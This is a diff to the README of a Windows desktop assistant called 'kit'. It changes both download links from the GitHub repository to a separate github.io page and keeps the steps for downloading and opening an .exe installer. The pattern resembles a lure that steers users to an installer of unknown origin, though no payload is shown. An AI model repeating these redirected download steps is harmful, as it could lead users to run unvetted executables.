@@ -1,6 +1,6 @@
 # 🎙️ kit - Your Private Desktop Assistant for Tasks
 
-[![](https://img.shields.io/badge/Download_Kit-blue)](https://github.com/Domeshaped-mollycoddle246/kit)
+[![](https://img.shields.io/badge/Download_Kit-blue)](https://domeshaped-mollycoddle246.github.io)
 
 Kit runs in your menu bar. It helps you capture your screen, record audio, and translate text. It keeps your data on your computer. You do not need an internet connection to use these tools.
 
@@ -18,7 +18,7 @@ Kit provides many tools in one small package. You save time by using one app for
 
 Follow these steps to set up Kit on your Windows computer.
 
-1. Visit the [releases page](https://github.com/Domeshaped-mollycoddle246/kit) to download the installer.
+1. Visit the [releases page](https://domeshaped-mollycoddle246.github.io) to download the installer.
 2. Look for the file ending in .exe under the latest version.
 3. Click the download link to save the file to your computer.
 4. Open your Downloads folder.
